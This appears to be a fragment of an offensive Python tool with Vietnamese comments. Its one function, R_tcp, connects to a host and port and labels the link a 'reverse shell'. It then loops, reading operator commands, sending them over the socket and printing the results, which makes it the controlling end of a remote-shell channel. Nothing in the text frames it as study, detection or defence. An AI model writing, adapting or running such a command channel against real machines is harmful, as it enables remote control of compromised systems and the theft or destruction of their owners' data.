def R_tcp(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 1024
    try:
        s.connect((host, port))
        print(f"Connected to {host}:{port} for reverse shell.")  # Thêm thông báo khi kết nối thành công
    except Exception as e:
        print(f"Failed to connect to {host}:{port}. Error: {e}")
        return  # Thoát hàm nếu không kết nối thành công

    while True:
        command = input("Enter the command you wanna execute: ")
        if command.lower() == "exit":
            s.send(command.encode())
            break  # Gửi "exit" và thoát khỏi vòng lặp
        try:
            s.send(command.encode())
            results = s.recv(BUFFER_SIZE).decode()
            print(f"Received results: {results}") 
        except Exception as e:
            print(f"Error receiving results: {e}") 
            break  
    s.close()
